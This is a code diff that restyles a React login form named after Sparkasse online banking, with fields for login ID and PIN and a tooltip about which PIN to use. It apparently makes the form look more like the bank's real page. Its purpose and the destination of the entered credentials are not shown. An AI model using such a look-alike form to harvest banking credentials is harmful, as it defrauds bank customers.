@@ -119,36 +119,55 @@ function SparkassenLoginPage() {
             <img
               src={logo}
               alt=""
-              className="mt-4 h-14 w-14 rounded-full object-contain"
+              className="mt-4 h-20 w-20 rounded-full object-contain"
             />
 
             <h1 className="mt-4 text-[24px] font-bold leading-tight text-[#0b051d]">{name}</h1>
-            <p className="mt-1 text-[15px] text-[#373544]">Melde dich mit deinen Onlinebanking-Daten an</p>
+            <p className="mt-3 text-[15px] text-[#373544]">Melde dich mit deinen Onlinebanking-Daten an</p>
 
-            <div className="mt-6 rounded-2xl border border-neutral-300 focus-within:border-[#0b051d] focus-within:ring-1 focus-within:ring-[#0b051d]">
-              <div className="px-4 py-3">
-                <label htmlFor="sk-login" className="sr-only">Anmeldename oder Legitimations-ID</label>
-                <input
-                  id="sk-login"
-                  type="text"
-                  value={login}
-                  onChange={(e) => setLogin(e.target.value)}
-                  placeholder="Anmeldename oder Legitimations-ID"
-                  className="h-8 w-full bg-transparent text-[15px] text-[#0b051d] outline-none placeholder:text-[#6b6b6b]"
-                />
+            <div className="mt-6 space-y-3">
+              <div className="relative rounded-xl border border-[rgb(112,110,123)] bg-white px-4 transition-colors hover:bg-neutral-100 focus-within:bg-white">
+                <div className="relative flex h-[58px] items-center">
+                  <input
+                    id="sk-login"
+                    type="text"
+                    value={login}
+                    onChange={(e) => setLogin(e.target.value)}
+                    placeholder=" "
+                    className="peer h-full w-full bg-transparent pt-4 text-[15px] font-semibold text-[#0b051d] outline-none placeholder:text-transparent"
+                  />
+                  <label
+                    htmlFor="sk-login"
+                    className="pointer-events-none absolute left-0 top-1/2 -translate-y-1/2 text-[15px] font-normal text-[#6b6b6b] transition-all peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-[11px] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-[11px]"
+                  >
+                    Anmeldename oder Legitimations-ID
+                  </label>
+                </div>
               </div>
-              <div className="border-t border-neutral-300" />
-              <div className="flex items-center gap-2 px-4 py-3">
-                <label htmlFor="sk-pin" className="sr-only">PIN</label>
-                <input
-                  id="sk-pin"
-                  type="password"
-                  value={pin}
-                  onChange={(e) => setPin(e.target.value)}
-                  placeholder="PIN"
-                  className="h-8 flex-1 bg-transparent text-[15px] text-[#0b051d] outline-none placeholder:text-[#6b6b6b]"
-                />
-                <Info className="h-5 w-5 shrink-0 text-[#6b6b6b]" strokeWidth={2} />
+
+              <div className="relative rounded-xl border border-[rgb(112,110,123)] bg-white px-4 transition-colors hover:bg-neutral-100 focus-within:bg-white">
+                <div className="relative flex h-[58px] items-center gap-2">
+                  <input
+                    id="sk-pin"
+                    type="password"
+                    value={pin}
+                    onChange={(e) => setPin(e.target.value)}
+                    placeholder=" "
+                    className="peer h-full flex-1 bg-transparent pt-4 text-[15px] font-semibold text-[#0b051d] outline-none placeholder:text-transparent"
+                  />
+                  <label
+                    htmlFor="sk-pin"
+                    className="pointer-events-none absolute left-0 top-1/2 -translate-y-1/2 text-[15px] font-normal text-[#6b6b6b] transition-all peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-[11px] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-[11px]"
+                  >
+                    PIN
+                  </label>
+                  <div className="group relative z-10">
+                    <Info className="h-5 w-5 shrink-0 cursor-help text-[#6b6b6b]" strokeWidth={2} />
+                    <div className="pointer-events-none absolute right-full top-1/2 mr-2 w-64 -translate-y-1/2 rounded-lg bg-black px-3 py-2 text-[12px] leading-snug text-white opacity-0 shadow-lg transition-opacity group-hover:opacity-100">
+                      Online-Banking PIN, nicht die 4-stellige PIN Ihrer EC-/Maestro-Karte
+                    </div>
+                  </div>
+                </div>
               </div>
             </div>
 
